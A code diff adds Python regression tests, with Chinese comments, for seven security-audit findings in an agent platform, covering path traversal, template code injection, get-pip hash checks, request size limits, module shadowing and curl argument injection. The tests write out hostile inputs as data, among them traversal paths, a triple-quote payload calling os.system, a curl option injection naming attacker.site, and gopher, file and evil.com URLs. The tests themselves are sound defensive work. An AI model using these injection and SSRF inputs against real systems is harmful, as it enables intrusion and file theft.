@@ -955,3 +955,179 @@ def read_conf():
                 fake_lnk.unlink(missing_ok=True)
             if fake_url.exists():
                 fake_url.unlink(missing_ok=True)
+
+    # ----------------------------------------------------
+    # 第三轮安全审计加固回归测试 (R3-VULN-01 ~ R3-VULN-07)
+    # ----------------------------------------------------
+    def test_r3_vuln_01_scaffold_code_injection_and_path_traversal(self):
+        """R3-VULN-01: 脚手架引擎防御名称路径穿越与模板三引号代码注入 (RCE)"""
+        from core.scaffold import create_agent_scaffold, create_workflow_scaffold
+
+        # 1. 测试 Agent 名称路径穿越拦截
+        with pytest.raises(ValueError):
+            create_agent_scaffold("../../evil_agent", "测试描述")
+
+        # 2. 测试 Workflow 名称路径穿越拦截
+        with pytest.raises((ValueError, PermissionError)):
+            create_workflow_scaffold("../../evil_wf", "测试描述")
+
+        # 3. 测试 Agent 注入三引号与代码执行语句是否被安全转义与阻断
+        malicious_desc = '"""\nimport os\nos.system("calc")\n"""'
+        test_agent_name = "sec_test_agent_r3"
+        cm = ConfigManager.get_instance()
+        target_dir = (cm.workspace_dir / "custom_agents") / test_agent_name
+        test_file = cm.root_dir / "tests" / f"test_{test_agent_name}.py"
+        try:
+            shutil.rmtree(target_dir, ignore_errors=True)
+            test_file.unlink(missing_ok=True)
+
+            agent_path = create_agent_scaffold(
+                name=test_agent_name,
+                description=malicious_desc,
+                is_custom=True,
+                agent_type="media"
+            )
+            assert agent_path.exists()
+            entry_py = agent_path / "entry.py"
+            assert entry_py.exists()
+
+            # 验证 entry.py 语法合法且不包含未转义的多行注入
+            import py_compile
+            py_compile.compile(str(entry_py), doraise=True)
+            py_compile.compile(str(test_file), doraise=True)
+
+            # 验证代码中不会执行 calc，且 repr 格式安全
+            content = entry_py.read_text(encoding="utf-8")
+            assert 'DEFAULT_DESCRIPTION = ' in content
+        finally:
+            shutil.rmtree(target_dir, ignore_errors=True)
+            test_file.unlink(missing_ok=True)
+
+        # 4. 测试 Workflow 注入三引号与换行
+        test_wf_name = "sec_test_wf_r3"
+        wf_file = cm.workflows_dir / f"{test_wf_name}.py"
+        try:
+            wf_file.unlink(missing_ok=True)
+            created_wf = create_workflow_scaffold(test_wf_name, malicious_desc)
+            assert created_wf.exists()
+            import py_compile
+            py_compile.compile(str(created_wf), doraise=True)
+        finally:
+            wf_file.unlink(missing_ok=True)
+
+    def test_r3_vuln_02_whisper_env_get_pip_hash_verification(self):
+        """R3-VULN-02: Whisper 装配脚本严格校验 get-pip.py 官方 SHA-256 白名单"""
+        from core.preflight import OFFICIAL_GET_PIP_SHA256_WHITELIST
+        import hashlib
+        import unittest.mock
+        cm = ConfigManager.get_instance()
+        cache_dir = cm.workspace_dir / "cache"
+        cache_dir.mkdir(parents=True, exist_ok=True)
+        fake_get_pip = cache_dir / "get-pip.py"
+
+        import scripts.setup_whisper_env as swe
+        old_env = os.environ.pop("LITIKJ_ALLOW_CUSTOM_GET_PIP", None)
+        try:
+            mock_proc = unittest.mock.MagicMock()
+            mock_proc.returncode = 1  # 模拟 pip 未安装
+
+            fake_resp = unittest.mock.MagicMock()
+            fake_resp.read.return_value = b"# Tampered get-pip payload\n" * 5000  # >100KB
+            fake_resp.__enter__.return_value = fake_resp
+
+            with unittest.mock.patch("subprocess.run", return_value=mock_proc), \
+                 unittest.mock.patch("urllib.request.urlopen", return_value=fake_resp):
+                res = swe.ensure_pip()
+                assert res is False
+                assert not fake_get_pip.exists()
+        finally:
+            if old_env is not None:
+                os.environ["LITIKJ_ALLOW_CUSTOM_GET_PIP"] = old_env
+            fake_get_pip.unlink(missing_ok=True)
+
+    def test_r3_vuln_03_headless_server_port_cleanup_contains_python_filter(self):
+        """R3-VULN-03: 无头服务器端口清理脚本具备 Python 进程名与路径过滤特征"""
+        headless_py = PROJECT_ROOT / "apps" / "server" / "headless_server.py"
+        content = headless_py.read_text(encoding="utf-8")
+        assert "$p.ProcessName -like '*python*'" in content or "python" in content.lower()
+        assert "Get-NetTCPConnection" in content
+        # 确保不再无差别强杀所有进程
+        assert "Where-Object {{ $_.OwningProcess -gt 0 -and $_.OwningProcess -ne $PID }}" in content
+        assert "Get-Process -Id $_.OwningProcess" in content
+
+    def test_r3_vuln_04_workflow_snapshot_traversal_blocked(self):
+        """R3-VULN-04: Workflow 快照读取与存储具备路径穿越防御"""
+        from core.workflow import Workflow
+        wf = Workflow("test_dummy")
+
+        # 尝试恶意穿越路径
+        evil_id = "../../etc_passwd"
+        wf._save_snapshot(evil_id, {"status": "pwned"})
+        loaded = Workflow.load_snapshot(evil_id)
+        assert loaded is None
+
+        # 尝试反斜杠路径穿越
+        evil_win = "..\\..\\windows_system32"
+        wf._save_snapshot(evil_win, {"status": "pwned"})
+        loaded_win = Workflow.load_snapshot(evil_win)
+        assert loaded_win is None
+
+    def test_r3_vuln_05_http_post_content_length_limit_and_temp_capsule_eviction(self):
+        """R3-VULN-05: HTTP API 网关限制请求体不超过 32MB 且限制卡带缓存最大 10 份"""
+        from apps.server.api_server import get_server_token
+        url = f"http://127.0.0.1:{self.port}/api/system/diagnose"
+
+        # 1. 模拟超过 32MB 的超大 Content-Length (拒绝服务 DoS 防御)
+        req = urllib.request.Request(
+            url,
+            headers={
+                "Host": f"127.0.0.1:{self.port}",
+                "X-Agent-OS-Token": get_server_token(),
+                "Content-Length": str(35 * 1024 * 1024)
+            },
+            method="POST"
+        )
+        try:
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                assert False, "超大 Content-Length 未被 413 Payload Too Large 拦截！"
+        except urllib.error.HTTPError as e:
+            assert e.code == 413
+
+        # 2. 验证 _temp_capsules 最大容量限制 (LRU / FIFO 淘汰)
+        from apps.server.api_server import KernelApiRequestHandler
+        handler_cls = KernelApiRequestHandler
+        handler_cls._temp_capsules.clear()
+        for i in range(15):
+            handler_cls._temp_capsules[f"token_{i}"] = b"dummy_capsule_data"
+            while len(handler_cls._temp_capsules) > 10:
+                oldest_k = next(iter(handler_cls._temp_capsules))
+                handler_cls._temp_capsules.pop(oldest_k, None)
+        assert len(handler_cls._temp_capsules) == 10
+        assert "token_0" not in handler_cls._temp_capsules
+        assert "token_14" in handler_cls._temp_capsules
+        handler_cls._temp_capsules.clear()
+
+    def test_r3_vuln_06_registry_uses_path_append_not_insert_zero(self):
+        """R3-VULN-06: 动态加载机制采用 sys.path.append，杜绝第三方技能目录遮蔽核心模块"""
+        registry_py = PROJECT_ROOT / "core" / "registry.py"
+        content = registry_py.read_text(encoding="utf-8")
+        assert "sys.path.insert(0, skill_dir_str)" not in content
+        assert "sys.path.insert(0, target_dir_str)" not in content
+        assert "sys.path.insert(0, sub_str)" not in content
+        assert "sys.path.append(skill_dir_str)" in content
+        assert "sys.path.append(target_dir_str)" in content
+        assert "sys.path.append(sub_str)" in content
+
+    def test_r3_vuln_07_agent_market_fetch_cdn_bytes_blocks_curl_options_and_protocols(self):
+        """R3-VULN-07: fetch_cdn_bytes 严格限制协议白名单并防御 curl 参数注入"""
+        from core.agent_market import fetch_cdn_bytes
+
+        # 1. 拦截以 '-' 开头的 curl 选项注入
+        assert fetch_cdn_bytes("-o evil.exe http://attacker.site") is None
+        assert fetch_cdn_bytes("--help") is None
+
+        # 2. 拦截非 http/https 协议
+        assert fetch_cdn_bytes("file:///C:/Windows/System32/drivers/etc/hosts") is None
+        assert fetch_cdn_bytes("gopher://127.0.0.1:6379") is None
+        assert fetch_cdn_bytes("ftp://evil.com/payload") is None
+        assert fetch_cdn_bytes("javascript:alert(1)") is None
